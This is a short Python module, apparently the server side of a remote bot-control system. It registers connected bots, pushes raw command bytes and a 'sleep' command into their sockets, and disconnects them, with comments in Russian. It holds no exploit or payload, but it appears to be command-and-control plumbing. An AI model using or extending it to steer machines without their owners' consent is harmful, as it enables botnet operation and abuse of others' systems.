# backend/Services/ClientManager.py

from logs import Log as logger

# Глобальный реестр активных соединений {id: (reader, writer)}
client = {}

async def close_client(client_id, send_sleep=True):
    """Принудительное закрытие сессии бота со стороны сервера"""
    if client_id not in client:
        return False
        
    _, writer = client.get(client_id, (None, None))
    if not writer:
        return False

    try:
        if send_sleep:
            # Даем боту команду корректно завершить работу
            writer.write(b"sleep\n") 
            await writer.drain()
        
        writer.close()
        await writer.wait_closed()
    except Exception: 
        pass
    finally:
        # Удаляем из реестра без отправки уведомлений в UI (это сделает Handler)
        client.pop(client_id, None)
        logger.info(f"[-] Бот {client_id} принудительно отключен")
    return True

async def close_all_client():
    """Массовое отключение всех активных ботов"""
    ids = list(client.keys())
    for cid in ids:
        await close_client(cid)
    return len(ids)

def list_clients():
    """Возвращает список ID всех ботов, находящихся в сети"""
    return [{"id": cid, "status": "online"} for cid in client.keys()]

async def send_binary_to_bot(bot_id, packet):
    """Отправка сырых байтов (команд) напрямую в сокет бота"""
    session = client.get(bot_id)
    if not session:
        return False
        
    try:
        _, writer = session
        writer.write(packet)
        await writer.drain()
        return True
    except Exception as e:
        logger.error(f"[Manager] Send error to {bot_id}: {e}")
        return False